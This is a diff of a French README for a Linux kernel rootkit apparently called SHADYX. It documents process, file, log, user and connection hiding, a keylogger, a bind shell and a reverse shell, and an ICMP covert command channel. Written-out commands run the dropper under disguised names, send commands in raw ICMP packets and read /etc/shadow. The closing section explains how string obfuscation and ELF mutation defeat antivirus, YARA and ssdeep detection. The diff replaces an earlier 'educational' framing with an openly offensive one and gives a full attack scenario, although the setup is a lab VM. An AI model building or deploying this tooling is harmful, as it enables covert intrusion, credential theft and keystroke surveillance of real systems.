@@ -1,433 +1,446 @@
-# Rootkit Linux - Module Noyau Educatif
+# SHADYX — Rootkit Linux
 
-Projet educatif de developpement d'un rootkit sous forme de module noyau Linux (LKM).
-Le rootkit combine deux approches :
-- **Module noyau (LKM)** : utilise **ftrace** pour hooker les appels systeme et **kprobes** pour resoudre les symboles noyau
-- **eBPF** : programmes XDP et tracepoints pour la manipulation reseau et la surveillance systeme
+Projet de sécurité offensive : rootkit Linux sous forme de module noyau (LKM), avec C2 multi-protocole, obfuscation ELF et canal covert eBPF.
 
-**Architecture** : x86-64  
-**Interface** : peripherique misc `/dev/rootkit` + commandes ioctl + maps BPF  
-**Acces** : restreint aux UID 0 (root) et 1000  
+**Architecture** : x86-64 — **Interface** : `/dev/rootkit` (ioctl) + BPF maps
 
-## Compilation
+---
 
-```bash
-make            # compile tout : module noyau + userspace + eBPF
-make modules    # module noyau seul
-make userspace  # binaire rootkit_malware seul
-make ebpf       # programmes eBPF + loader seul
-make clean      # nettoie tous les fichiers generes
+## Auteurs
+
+**Mohand ACHERIR**
+- Hooking de syscalls (ftrace + kprobes)
+- Mécanismes de dissimulation : processus, fichiers, module, réseau, logs, utilisateurs
+- Fonctionnalités offensives : privesc, backdoor, reverse shell, keylogger
+- Protections : fichiers protégés, signal magique, canal de communication secondaire
+- Programmes eBPF : XDP (filtrage réseau, C2 covert) + tracepoints (exec monitor)
+- Interface userspace : ioctl + gestion via BPF maps
+
+**Sacha MORISSET-LARRE**
+- Obfuscation des strings sensibles (XOR compile-time, macro `DEOBFS`)
+- C2 interactif multi-protocole (TCP, ICMP, HTTP, DNS) avec REPL
+- Dropper : connexion au C2, réception du .ko, chargement via `finit_module`
+- Metamorph : mutateur ELF (build-id, symboles, dead code, timestamps)
+- Pipeline de build automatisé : compilation cross-kernel, nommage aléatoire
+- Documentation et environnement de test (VM Alpine, disque partagé)
+
+---
+
+## Architecture
+
 ```
-
-**Dependances eBPF** : `clang`, `libbpf-dev`, `libelf-dev`, `zlib1g-dev`
-
-## Chargement / Dechargement
-
-```bash
-sudo insmod rootkit.ko    # charger le module
-sudo rmmod rootkit         # decharger le module
-```
-
-## Programme compagnon (userspace)
-
-Le binaire `rootkit_malware` permet de controler le rootkit depuis l'espace utilisateur :
-
-```bash
-./rootkit_malware <commande> [arguments]
-```
-
----
-
-## Fonctionnalites
-
-### 1. Dissimulation de processus (multi-PID)
-
-Masque jusqu'a **16 processus** simultanement dans `/proc`. Les entrees correspondantes sont filtrees du syscall `getdents64`, rendant les processus invisibles a `ps`, `top`, `htop`, etc.
-
-```bash
-./rootkit_malware hide_pid 1234      # cacher un processus
-./rootkit_malware hide_pid 5678      # cacher un deuxieme processus
-./rootkit_malware unhide_pid 1234    # rendre un processus visible a nouveau
-```
-
-**Hook** : `__x64_sys_getdents64`  
-**ioctl** : `RK_CMD_HIDE_PID` (1), `RK_CMD_UNHIDE_PID` (10)
-
----
-
-### 2. Dissimulation de fichiers et services
-
-Filtre automatiquement les entrees de repertoire correspondant au nom du module (`rootkit`) et au service cache (`network-helper.service`) dans tous les listings de repertoire.
-
-**Hook** : `__x64_sys_getdents64`
-
----
-
-### 3. Dissimulation du module noyau
-
-Deux mecanismes complementaires :
-
-- **Liste chainee** : `list_del_init()` retire le module de la liste des modules noyau, le rendant invisible a `lsmod`
-- **Kobject** : `kobject_del()` supprime l'entree `/sys/module/rootkit`
-- **Filtrage /proc/modules** : le hook `read` supprime la ligne du module dans `/proc/modules`
-
-Le module se cache **automatiquement au chargement**.
-
-```bash
-./rootkit_malware hide_mod     # cacher le module (fait automatiquement)
-./rootkit_malware show_mod     # rendre le module visible (necessaire avant rmmod)
-```
-
-**ioctl** : `RK_CMD_HIDE_MODULE` (6), `RK_CMD_SHOW_MODULE` (7)
-
----
-
-### 4. Dissimulation de la persistance
-
-Filtre les lectures du fichier `/etc/rc.local` pour supprimer toute ligne contenant `insmod`, masquant ainsi le mecanisme de persistance du rootkit.
-
-**Hook** : `__x64_sys_read`
-
----
-
-### 5. Dissimulation des logs (dmesg / syslog)
-
-Intercepte les lectures sur `/dev/kmsg`, `/proc/kmsg`, `/var/log/syslog` et `/var/log/kern.log` pour supprimer toute ligne contenant le mot `rootkit`. Empeche `dmesg` de reveler la presence du module.
-
-**Hook** : `__x64_sys_read`
-
----
-
-### 6. Dissimulation de connexions reseau
-
-#### TCP
-Filtre `/proc/net/tcp` pour masquer le port du backdoor des outils comme `netstat`, `ss`, etc.
-
-**Hook** : `tcp4_seq_show`
-
-#### UDP
-Filtre egalement `/proc/net/udp` pour une dissimulation complete des connexions reseau.
-
-**Hook** : `udp4_seq_show`
-
----
-
-### 7. Dissimulation d'utilisateur
-
-Filtre les lectures de `/etc/passwd` et `/etc/shadow` pour supprimer les lignes correspondant a un nom d'utilisateur specifie. L'utilisateur cache devient invisible a `cat /etc/passwd`, `getent passwd`, etc.
-
-```bash
-./rootkit_malware hide_user backdoor_user    # cacher un utilisateur
-./rootkit_malware unhide_user                # arreter de cacher l'utilisateur
-```
-
-**Hook** : `__x64_sys_read`  
-**ioctl** : `RK_CMD_HIDE_USER` (11)
-
----
-
-### 8. Escalade de privileges
-Execute une commande arbitraire en tant que root via `call_usermodehelper()`.
-
-```bash
-./rootkit_malware privesc_cmd "id > /tmp/proof.txt"
-```
-
-**ioctl** : `RK_CMD_PRIVESC` (0)
-
----
-
-### 9. Backdoor reseau (bind shell)
-
-Ouvre un socket TCP en ecoute sur un port configurable. A la connexion, le client envoie un mot de passe ; si valide, un shell root (`/bin/sh`) est lance via `call_usermodehelper()`.
-
-Le port est automatiquement masque dans `/proc/net/tcp` et `/proc/net/udp`.
-
-```bash
-./rootkit_malware backdoor_pass "s3cr3t"    # definir le mot de passe
-./rootkit_malware backdoor 4444             # ouvrir le backdoor sur le port 4444
-```
-
-Connexion depuis l'attaquant :
-```bash
-echo "s3cr3t" | nc <cible> 4444
-```
-
-**ioctl** : `RK_CMD_OPEN_BACKDOOR` (4), `RK_CMD_SET_BACKDOOR_PASS` (5)
-
----
-
-### 10. Reverse shell (connexion sortante)
-
-Lance un shell inverse vers une adresse IP et un port specifies. Plus utile que le bind shell lorsque la cible est derriere un NAT ou un pare-feu.
-
-Le shell est lance dans un thread noyau separe via `call_usermodehelper()` avec `/bin/bash`.
-
-```bash
-./rootkit_malware revshell 10.0.0.1:4444
-```
-
-Cote attaquant, ecouter avec :
-```bash
-nc -lvnp 4444
-```
-
-**ioctl** : `RK_CMD_REVERSE_SHELL` (14)
-
----
-
-### 11. Keylogger
-
-Enregistre les frappes clavier en s'inscrivant comme handler dans le sous-systeme `input` du noyau. Les scancodes sont convertis en caracteres lisibles (disposition US QWERTY) et stockes dans un buffer circulaire de 4 Ko protege par spinlock.
-
-```bash
-./rootkit_malware keylog_toggle    # activer / desactiver le keylogger
-./rootkit_malware keylog_read      # lire et vider le buffer de frappes
-```
-
-**ioctl** : `RK_CMD_TOGGLE_KEYLOG` (9), `RK_CMD_GET_KEYLOG` (8)
-
----
-
-### 12. Protection de fichiers
-
-Empeche la suppression (`rm`, `unlink`) et le renommage (`mv`, `rename`) de fichiers critiques en hookant les syscalls `unlinkat` et `renameat2`. Toute tentative retourne `-EACCES`. Supporte jusqu'a **8 fichiers proteges** simultanement.
-
-```bash
-./rootkit_malware protect /etc/rc.local     # proteger un fichier
-./rootkit_malware protect rootkit.ko        # proteger le module lui-meme
-./rootkit_malware unprotect /etc/rc.local   # retirer la protection
-```
-
-**Hooks** : `__x64_sys_unlinkat`, `__x64_sys_renameat2`  
-**ioctl** : `RK_CMD_PROTECT_FILE` (12), `RK_CMD_UNPROTECT_FILE` (13)
-
----
-
-### 13. Canal de communication secondaire
-
-Permet d'injecter un message dans le fichier `/tmp/.rk_cmd`. Lorsqu'un processus autorise lit ce fichier, le contenu reel est remplace par le message defini via ioctl.
-
-```bash
-./rootkit_malware msg "I am Gr00t"
-cat /tmp/.rk_cmd    # affiche "I am Gr00t"
-```
-
-**ioctl** : `RK_CMD_SET_MSG` (3)
-
----
-
-### 14. Recuperation de l'UID courant
-
-Commande utilitaire pour verifier l'UID du processus appelant.
-
-```bash
-./rootkit_malware uid
-```
-
-**ioctl** : `RK_CMD_GETUID` (2)
-
----
-
-## Resume des hooks syscall
-
-| Hook                       | Syscall / Fonction    | Fonctionnalite                              |
-|----------------------------|-----------------------|---------------------------------------------|
-| `new_getdents64`           | `__x64_sys_getdents64`| Dissimulation fichiers, services, processus |
-| `new_read`                 | `__x64_sys_read`      | Filtrage modules, logs, passwd, persistance |
-| `new_tcp4_seq_show`        | `tcp4_seq_show`       | Dissimulation connexions TCP                |
-| `new_udp4_seq_show`        | `udp4_seq_show`       | Dissimulation connexions UDP                |
-| `new_unlinkat`             | `__x64_sys_unlinkat`  | Protection fichiers (suppression)           |
-| `new_renameat2`            | `__x64_sys_renameat2` | Protection fichiers (renommage)             |
-
-## Resume des commandes ioctl
-
-| Commande                   | N°  | Direction | Description                          |
-|----------------------------|-----|-----------|--------------------------------------|
-| `RK_CMD_PRIVESC`           | 0   | W         | Escalade de privileges               |
-| `RK_CMD_HIDE_PID`          | 1   | W         | Cacher un PID                        |
-| `RK_CMD_GETUID`            | 2   | R         | Lire l'UID courant                   |
-| `RK_CMD_SET_MSG`           | 3   | W         | Definir message canal secondaire     |
-| `RK_CMD_OPEN_BACKDOOR`     | 4   | WR        | Ouvrir backdoor TCP                  |
-| `RK_CMD_SET_BACKDOOR_PASS` | 5   | WR        | Definir mot de passe backdoor        |
-| `RK_CMD_HIDE_MODULE`       | 6   | W         | Cacher le module de lsmod            |
-| `RK_CMD_SHOW_MODULE`       | 7   | W         | Rendre le module visible             |
-| `RK_CMD_GET_KEYLOG`        | 8   | R         | Lire le buffer keylogger             |
-| `RK_CMD_TOGGLE_KEYLOG`     | 9   | W         | Activer/desactiver keylogger         |
-| `RK_CMD_UNHIDE_PID`        | 10  | W         | Rendre un PID visible                |
-| `RK_CMD_HIDE_USER`         | 11  | W         | Cacher un utilisateur                |
-| `RK_CMD_PROTECT_FILE`      | 12  | W         | Proteger un fichier                  |
-| `RK_CMD_UNPROTECT_FILE`    | 13  | W         | Retirer la protection d'un fichier   |
-| `RK_CMD_REVERSE_SHELL`     | 14  | W         | Lancer un reverse shell              |
-
----
-
-## Fonctionnalites eBPF
-
-Les programmes eBPF fonctionnent **independamment** du module noyau. Ils sont charges depuis l'espace utilisateur via `libbpf` et s'attachent a des points d'accroche XDP (reseau) ou tracepoints (systeme). La communication entre noyau et userspace se fait via des **BPF maps** (hash maps, arrays, ring buffers).
-
-Le loader unifie est : `ebpf/rk_ebpf_loader`
-
-```bash
-sudo ./ebpf/rk_ebpf_loader <commande> [args]
+rootkit/
+├── rootkit_module/      ← Module noyau + companion (ioctl) + dropper
+│   └── ebpf/            ← Programmes eBPF (XDP, tracepoints)
+├── c2/                  ← Console C2 interactive (REPL multi-protocole)
+├── metamorph/           ← Mutateur ELF
+└── linux-6.19.9/        ← Sources kernel cible (bzImage + headers)
 ```
 
 ---
 
-### 15. Dissimulation de paquets reseau (XDP anti-tcpdump)
-
-Programme **XDP** qui inspecte chaque paquet entrant au niveau le plus bas de la pile reseau (avant `AF_PACKET`). Si le port source ou destination correspond a un port cache, le paquet est silencieusement **DROP** avant meme qu'il n'atteigne la couche de capture.
-
-**Resultat** : les paquets du backdoor sont completement invisibles a `tcpdump`, `wireshark`, `tshark` et tout outil base sur `AF_PACKET`/`libpcap`.
+## Build
 
 ```bash
-# Attacher le filtre XDP sur l'interface reseau
+cd rootkit_module
+
+make modules    # compile le .ko (nom aléatoire → .rk_name)
+make userspace  # compile le companion (nom aléatoire → .rk_bin_name)
+make ebpf       # compile les programmes eBPF (nécessite clang)
+make clean
+
+# Dépendances eBPF
+sudo apt install clang libbpf-dev libelf-dev
+```
+
+---
+
+## Build — Headers kernel cible
+
+Le module doit être compilé avec les headers du kernel qui tourne sur la cible. Le Makefile cherche d'abord un dossier `build-sys-linux-<KVER>/` à la racine du projet, sinon il utilise `/lib/modules/<KVER>/build`.
+
+### Cas 1 — Kernel fourni (6.19.9)
+
+Les sources sont dans `linux-6.19.9/`. Créer le lien symbolique attendu par le Makefile :
+
+```bash
+cd rootkit        # racine du projet
+ln -sfn linux-6.19.9 build-sys-linux-6.19.9
+
+cd rootkit_module
+make modules KVER=6.19.9
+```
+
+### Compiler le kernel depuis les sources
+
+Si tu as les sources complètes dans `linux-6.19.9/` :
+
+```bash
+cd linux-6.19.9
+
+# Générer une config minimale x86_64
+make defconfig
+
+# Activer le réseau (pour tester le C2)
+scripts/config --enable CONFIG_NET
+scripts/config --enable CONFIG_INET
+scripts/config --enable CONFIG_E1000       # driver NIC QEMU
+scripts/config --enable CONFIG_NETDEVICES
+make olddefconfig   # résoudre les dépendances
+
+# Compiler (utilise tous les cœurs)
+make -j$(nproc) bzImage
+
+# Le kernel est ici
+ls arch/x86/boot/bzImage
+```
+
+Pour installer les modules kernel dans un rootfs cible :
+```bash
+make modules -j$(nproc)
+make modules_install INSTALL_MOD_PATH=/chemin/rootfs
+```
+
+---
+
+### Cas 2 — Ubuntu / Debian
+
+```bash
+sudo apt install linux-headers-<KVER>
+# ex: sudo apt install linux-headers-6.8.0-106-generic
+
+make modules KVER=6.8.0-106-generic
+```
+
+### Cas 3 — Alpine Linux
+
+```bash
+KVER="6.12.79-0-virt"
+wget "https://dl-cdn.alpinelinux.org/alpine/v3.21/main/x86_64/linux-virt-dev-6.12.79-r0.apk" \
+    -O /tmp/alpine-headers.apk
+mkdir -p /tmp/alpine-headers
+tar -xzf /tmp/alpine-headers.apk -C /tmp/alpine-headers 2>/dev/null
+
+ln -sfn /tmp/alpine-headers/usr/src/linux-headers-${KVER} \
+    build-sys-linux-${KVER}
+
+make modules KVER=${KVER}
+```
+
+### Cas 4 — Kernel inconnu (compilation sur la cible)
+
+```bash
+# Sur la cible (nécessite gcc + headers)
+mount /dev/sdb /mnt
+cd /mnt
+make modules && make userspace
+insmod $(cat .rk_name).ko
+```
+
+---
+
+## Build — Machine victime (`command.sh`)
+
+`command.sh` construit une image disque QEMU complète (Alpine + kernel 6.19.9 + SSH + réseau). À lancer **après** `make modules && make userspace` :
+
+```bash
+cd rootkit_module
+make modules && make userspace   # génère .rk_name et .rk_bin_name
+
+cd ..
+./command.sh   # produit disk.img et disk.qcow2
+```
+
+Le script :
+1. Crée une image disque ext4 de 2GB
+2. Peuple un rootfs Alpine via Docker (openssh, build-base, libbpf…)
+3. Configure SSH (`PermitRootLogin yes`, génère les clés hôtes, `/var/empty`)
+4. Configure le réseau statique (eth0 → 10.0.0.2)
+5. Copie le kernel (`linux-6.19.9/arch/x86/boot/bzImage`) et installe les modules
+6. Copie le `.ko` (lu depuis `.rk_name`) dans `/root/rootkit/`
+7. Installe GRUB
+8. Convertit en `disk.qcow2` et configure TAP + NAT sur le host
+
+```bash
+# Lancer la VM générée
+./run.sh
+
+# Dans la VM
+insmod /root/rootkit/<nom>.ko
+rk_demo uid
+```
+
+---
+
+## Clean
+
+```bash
+cd rootkit_module
+make clean   # supprime .ko, .o, companion, gen_name, .rk_name, .rk_bin_name, eBPF
+```
+
+> `make clean` supprime aussi les noms générés. Relance `make modules && make userspace` avant `command.sh` ou tout déploiement.
+
+---
+
+## Scénario d'attaque complet
+
+Prérequis : `./command.sh` exécuté, VM lancée avec `./run.sh`.
+
+### 1. Accès initial — SSH sur la machine victime
+
+```bash
+ssh root@10.0.0.2
+# mot de passe affiché à la fin de command.sh
+```
+
+### 2. Déposer le dropper sur la victime
+
+```bash
+# Sur l'attaquant — compiler le dropper (statique, compatible musl/glibc)
+cd rootkit_module
+make dropper C2_HOST=10.0.0.1 C2_PORT=4444
+
+# Le nom généré est dans .rk_dropper_name, ex: power-manager-agent
+scp $(cat .rk_dropper_name) root@10.0.0.2:/tmp/acpi-event-daemon
+```
+
+### 3. Lancer le C2 sur l'attaquant
+
+```bash
+cd c2 && make && ./c2
+```
+
+```
+[c2] > set LPORT 4444
+[c2] > run
+# [*] En attente du dropper sur le port 4444...
+```
+
+### 4. Exécuter le dropper sur la victime
+
+```bash
+# Sur la victime (via SSH)
+chmod +x /tmp/acpi-event-daemon
+/tmp/acpi-event-daemon
+```
+
+Le dropper :
+1. Récupère la version kernel (`uname -r`)
+2. Se connecte au C2 sur `10.0.0.1:4444`
+3. Envoie la version kernel
+
+### 5. Le C2 build et envoie le rootkit
+
+Le C2 automatiquement :
+1. Compile le `.ko` pour la version kernel reçue
+2. Compile le companion (statique)
+3. Applique metamorph (mutations ELF) sur le `.ko`
+4. Envoie le `.ko` puis le companion sur le même socket
+
+Le dropper :
+1. Reçoit le `.ko`, le charge via `finit_module`
+2. Reçoit le companion, l'installe dans `/tmp/.polkit-agent` (exécutable)
+3. S'auto-supprime
+
+### 6. Rootkit actif — contrôle
+
+Le companion a été installé automatiquement par le dropper dans `/tmp/.polkit-agent` :
+
+```bash
+# Sur la victime
+/tmp/.polkit-agent uid           # doit retourner 0
+/tmp/.polkit-agent hide_mod      # disparaître de lsmod
+/tmp/.polkit-agent hide_pid $$   # cacher le shell courant
+/tmp/.polkit-agent keylog_toggle # activer le keylogger
+```
+
+### 7. Post-exploitation via eBPF (canal covert)
+
+```
+[c2] > set TARGET 10.0.0.2
+[c2] > exec cat /etc/shadow > /tmp/.out
+[c2] > exec cat /tmp/.out
+```
+
+Les commandes transitent dans des paquets ICMP avec magic `0xDEAD1337` — aucune connexion TCP visible.
+
+---
+
+## Déploiement sans C2
+
+```bash
+# Sur la machine attaquante
+cd rootkit_module
+make modules KVER=<version_cible>
+make userspace
+
+# Les noms sont dans .rk_name et .rk_bin_name
+# ex: disk-broker-manager.ko  et  session-handler-helper
+scp $(cat .rk_name).ko     root@10.0.0.2:/tmp/
+scp $(cat .rk_bin_name)    root@10.0.0.2:/tmp/
+
+# Sur la cible
+insmod /tmp/$(cat .rk_name).ko
+/tmp/$(cat .rk_bin_name) uid
+```
+
+---
+
+## Déploiement avec le C2
+
+```bash
+# Machine attaquante
+cd c2 && make && cd ../metamorph && make metamorph
+cd ../c2 && ./c2
+```
+
+```
+[c2] > set LPORT 4444
+[c2] > run
+```
+
+```bash
+# Machine attaquante — compiler et envoyer le dropper
+cd rootkit_module
+make dropper C2_HOST=<IP> C2_PORT=4444
+scp $(cat .rk_dropper_name) root@10.0.0.2:/tmp/acpi-event-daemon
+
+# Machine cible — exécuter le dropper
+ssh root@10.0.0.2 "chmod +x /tmp/acpi-event-daemon && /tmp/acpi-event-daemon"
+```
+
+### Protocoles disponibles
+
+| Protocole | Usage |
+|-----------|-------|
+| `tcp`  | Dropper callback — C2 reçoit la connexion, envoie le .ko |
+| `icmp` | Livraison covert dans des pings (magic `0xDEAD1337`) |
+| `http` | Livraison déguisée en firmware update |
+| `dns`  | Livraison fragmentée en enregistrements TXT |
+
+### Commandes C2
+
+| Commande | Description |
+|----------|-------------|
+| `set <opt> <val>` | Configurer une option |
+| `show options` | Afficher la configuration |
+| `run` | Lancer le pipeline |
+| `exec <cmd>` | Envoyer une commande via ICMP covert |
+| `exit` | Quitter |
+
+---
+
+## Companion — Contrôle du rootkit
+
+Le companion (nom aléatoire, stocké dans `.rk_bin_name`) contrôle le module via ioctl :
+
+```bash
+./companion uid                        # UID courant
+./companion hide_pid <pid>             # Cacher un PID de /proc
+./companion unhide_pid <pid>
+./companion hide_mod                   # Disparaître de lsmod / /sys/module
+./companion show_mod                   # Réapparaître (nécessaire avant rmmod)
+./companion privesc_cmd "id"           # Exécuter commande en root
+./companion backdoor <port>            # Ouvrir backdoor TCP
+./companion backdoor_pass <pass>       # Mot de passe backdoor
+./companion revshell <ip:port>         # Reverse shell
+./companion keylog_toggle              # Activer/désactiver keylogger
+./companion keylog_read                # Lire le buffer keylogger
+./companion hide_user <user>           # Cacher un user de /etc/passwd
+./companion unhide_user
+./companion protect <path>             # Protéger un fichier contre rm/mv
+./companion unprotect <path>
+./companion toggle                     # Toggle rootkit via signal magique
+./companion msg <text>                 # Message canal secondaire
+```
+
+---
+
+## Fonctionnalités du module
+
+| # | Fonctionnalité | Hook |
+|---|----------------|------|
+| 1 | Dissimulation processus (jusqu'à 16 PIDs) | `getdents64` |
+| 2 | Dissimulation fichiers / services | `getdents64` |
+| 3 | Dissimulation module (`lsmod`, `/sys/module`, `/proc/modules`) | `read` + kobject |
+| 4 | Dissimulation persistance (`/etc/rc.local`) | `read` |
+| 5 | Filtrage logs (`dmesg`, `syslog`, `kern.log`) | `read` |
+| 6 | Dissimulation connexions TCP/UDP | `tcp4_seq_show`, `udp4_seq_show` |
+| 7 | Dissimulation utilisateur (`/etc/passwd`, `/etc/shadow`) | `read` |
+| 8 | Escalade de privilèges par commande | ioctl → `call_usermodehelper` |
+| 9 | Backdoor TCP (bind shell protégé par mot de passe) | socket kernel |
+| 10 | Reverse shell | `call_usermodehelper` |
+| 11 | Keylogger (buffer 4Ko, spinlock) | `input_handler` |
+| 12 | Protection fichiers contre `rm`/`mv` | `unlinkat`, `renameat2` |
+| 13 | Canal de communication secondaire | `read` |
+
+---
+
+## eBPF
+
+Trois programmes eBPF indépendants du module kernel, chargés via `ebpf/rk_ebpf_loader` :
+
+### XDP — Masquage réseau (`xdp_hide.bpf.c`)
+Drop les paquets sur un port avant la couche de capture — invisible à tcpdump/Wireshark.
+```bash
 sudo ./ebpf/rk_ebpf_loader xdp_attach eth0
-
-# Activer le filtrage
+sudo ./ebpf/rk_ebpf_loader xdp_hide_port 9999
 sudo ./ebpf/rk_ebpf_loader xdp_enable
-
-# Cacher le port du backdoor
-sudo ./ebpf/rk_ebpf_loader xdp_hide_port 4444
-
-# Rendre un port visible a nouveau
-sudo ./ebpf/rk_ebpf_loader xdp_unhide_port 4444
-
-# Desactiver le filtrage (sans detacher)
-sudo ./ebpf/rk_ebpf_loader xdp_disable
-
-# Detacher completement le programme XDP
-sudo ./ebpf/rk_ebpf_loader xdp_detach eth0
 ```
 
-**Programme BPF** : `ebpf/xdp_hide.bpf.c`  
-**Type** : XDP (`BPF_PROG_TYPE_XDP`)  
-**Maps** :
-- `hidden_ports` (hash) : ports a cacher (cle = port, valeur = 1)
-- `xdp_enabled` (array) : flag d'activation (0 = off, 1 = on)
-
----
-
-### 16. Moniteur d'execution (tracepoint execve)
-
-Programme **tracepoint** qui se branche sur `sched:sched_process_exec` pour capturer **chaque execution de programme** sur le systeme. Les informations collectees sont :
-
-- **PID** du nouveau processus
-- **UID** de l'utilisateur
-- **PPID** du processus parent
-- **comm** (nom du processus)
-- **filename** (chemin complet de l'executable)
-
-Les evenements sont transmis en temps reel au userspace via un **ring buffer BPF**.
-
+### XDP — Canal C2 covert ICMP (`icmp_c2.bpf.c`)
+Intercepte les pings contenant `0xDEAD1337`, exécute la commande embarquée, drop le paquet.
 ```bash
-# Attacher le moniteur et afficher en temps reel
+# Via C2 :
+[c2] > exec id > /tmp/.rk_out
+
+# Manuellement :
+sudo python3 -c "
+import struct, socket
+s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+magic = struct.pack('!I', 0xDEAD1337)
+cmd = b'id > /tmp/.rk_out'
+icmp = struct.pack('!BBHHH', 8, 0, 0, 0, 0) + magic + cmd
+s.sendto(icmp, ('<IP_cible>', 0))
+"
+```
+
+### Tracepoint — Monitoring execve (`exec_monitor.bpf.c`)
+Capture tous les `execve` en temps réel via ring buffer.
+```bash
 sudo ./ebpf/rk_ebpf_loader exec_watch
-
-# Exemple de sortie :
-# [EXEC] pid=12345  uid=1000  ppid=1234   comm=bash             file=/usr/bin/ls
-# [EXEC] pid=12346  uid=0     ppid=1       comm=cron             file=/usr/sbin/logrotate
-
-# Attacher sans affichage (mode daemon)
-sudo ./ebpf/rk_ebpf_loader exec_attach
 ```
-
-**Programme BPF** : `ebpf/exec_monitor.bpf.c`  
-**Type** : Tracepoint (`BPF_PROG_TYPE_TRACEPOINT`)  
-**Maps** :
-- `exec_events` (ring buffer, 256 Ko) : evenements d'execution
-- `exec_enabled` (array) : flag d'activation
 
 ---
 
-### 17. Canal C2 covert via ICMP
+## Metamorph
 
-Programme **XDP** qui intercepte les paquets **ICMP Echo Request** (ping) contenant un motif magique (`0xDEAD1337`) dans le payload. La commande cachee dans le reste du payload est extraite, transmise au userspace via ring buffer, puis executee. Le paquet ICMP est ensuite **DROP** pour ne laisser aucune trace reseau.
-
-Ce mecanisme permet un canal de **commande et controle (C2)** totalement covert :
-- Le trafic ressemble a un simple ping
-- Les paquets C2 ne sont jamais delivres a la pile reseau (drop XDP)
-- Aucune connexion TCP/UDP n'est ouverte
-- Invisible aux IDS/IPS bases sur les connexions
+Mutateur ELF appliqué automatiquement par le C2 avant livraison :
 
 ```bash
-# Cote cible : attacher et ecouter les commandes C2
-sudo ./ebpf/rk_ebpf_loader c2_watch eth0
-
-# Cote attaquant : envoyer une commande cachee dans un ping
-sudo python3 ebpf/icmp_c2_send.py 192.168.1.100 "id > /tmp/.rk_out"
-sudo python3 ebpf/icmp_c2_send.py 192.168.1.100 "cat /etc/shadow > /tmp/.rk_shadow"
-
-# Attacher sans ecoute (mode daemon)
-sudo ./ebpf/rk_ebpf_loader c2_attach eth0
-
-# Detacher le canal C2
-sudo ./ebpf/rk_ebpf_loader c2_detach eth0
+./metamorph <input> <output>        # binaire userspace
+./metamorph <input> <output> --ko   # module kernel
 ```
 
-**Programme BPF** : `ebpf/icmp_c2.bpf.c`  
-**Script attaquant** : `ebpf/icmp_c2_send.py`  
-**Type** : XDP (`BPF_PROG_TYPE_XDP`)  
-**Maps** :
-- `icmp_cmd_events` (ring buffer, 256 Ko) : commandes recues
-- `icmp_c2_enabled` (array) : flag d'activation  
-**Magic** : `0xDEAD1337` (4 octets en debut de payload ICMP)
+| Transform | Effet |
+|-----------|-------|
+| `build-id` | Randomise le hash GNU build-id |
+| `rename-syms` | Renomme les symboles locaux en `_fXXXX` |
+| `dead-code` | Injecte du faux code x86-64 dans `.text` |
+| `nuke-shdrs` | Efface la section header table |
+| `bss-pad` | Augmente `.bss` de N octets aléatoires |
+| `timestamps` | Forge mtime/atime entre −6 et −18 mois |
+| `.comment` | Remplace la version GCC par une fausse |
 
 ---
 
-## Architecture eBPF
+## Pourquoi ces choix
 
-```
-                     Espace utilisateur
-    ┌─���────────────────────────────────────────────┐
-    │  rk_ebpf_loader          icmp_c2_send.py     │
-    │    │                        │                 │
-    │    ├─ libbpf (chargement)   └─ raw socket     │
-    │    ├─ ring_buffer (lecture)     ICMP           │
-    │    └─ bpf maps (config)                       │
-    └────────┬──────────────────────────────────────┘
-             │  BPF syscall
-    ═════════╪══════════════════════════════════════════
-             │  Espace noyau
-    ┌────���───┴──────────────────────────────────────┐
-    │                                               │
-    │  XDP hook (NIC driver)                        │
-    │    ├─ xdp_hide.bpf.o     → DROP ports caches │
-    │    └─ icmp_c2.bpf.o      → DROP + extract C2 │
-    │                                               │
-    │  Tracepoint (sched_process_exec)              │
-    │    └─ exec_monitor.bpf.o → ring buffer events │
-    │                                               │
-    │  BPF Maps (donnees partagees)                 │
-    │    ├─ hidden_ports   (hash)                   │
-    │    ├─ xdp_enabled    (array)                  │
-    │    ├─ exec_events    (ringbuf)                │
-    │    ├─ exec_enabled   (array)                  │
-    │    ├─ icmp_cmd_events(ringbuf)                │
-    │    └─ icmp_c2_enabled(array)                  ��
-    └───────────────────────────────────────────────┘
-```
+**Obfuscation strings** — Les strings sensibles sont XOR'd au compile-time dans `.rodata`. `strings` et les scans statiques ne les voient pas. Décodage sur la stack via `DEOBFS()`, disparu à la fin du bloc.
 
-## Resume des programmes eBPF
+**Metamorph** — Chaque build produit un binaire différent. YARA et ssdeep ne peuvent pas corréler deux exécutions.
 
-| Programme            | Type       | Fonctionnalite                          | Maps                              |
-|----------------------|------------|-----------------------------------------|-----------------------------------|
-| `xdp_hide.bpf.o`    | XDP        | Drop paquets vers/depuis ports caches   | `hidden_ports`, `xdp_enabled`     |
-| `exec_monitor.bpf.o`| Tracepoint | Surveillance de toutes les executions   | `exec_events`, `exec_enabled`     |
-| `icmp_c2.bpf.o`     | XDP        | Canal C2 covert via ICMP ping           | `icmp_cmd_events`, `icmp_c2_enabled` |
+**C2 multi-protocole** — Un seul outil unifie build, mutation et livraison. Le socket dropper est réutilisé pour l'envoi du `.ko` — une seule connexion sortante.
 
-## Commandes du loader eBPF
-
-| Commande                        | Description                              |
-|---------------------------------|------------------------------------------|
-| `xdp_attach <iface>`           | Attacher le filtre XDP                   |
-| `xdp_detach <iface>`           | Detacher le filtre XDP                   |
-| `xdp_hide_port <port>`         | Cacher un port du trafic capture         |
-| `xdp_unhide_port <port>`       | Rendre un port visible                   |
-| `xdp_enable`                   | Activer le filtre XDP                    |
-| `xdp_disable`                  | Desactiver le filtre XDP                 |
-| `exec_watch`                   | Surveiller les executions en temps reel  |
-| `exec_attach`                  | Attacher le moniteur sans affichage      |
-| `c2_watch <iface>`             | Ecouter les commandes C2 ICMP           |
-| `c2_attach <iface>`            | Attacher le C2 sans ecoute              |
-| `c2_detach <iface>`            | Detacher le canal C2                     |
+**eBPF XDP** — Le drop au niveau driver est antérieur à la couche `AF_PACKET`. Tcpdump et Wireshark ne voient jamais les paquets. Aucun module noyau supplémentaire requis.
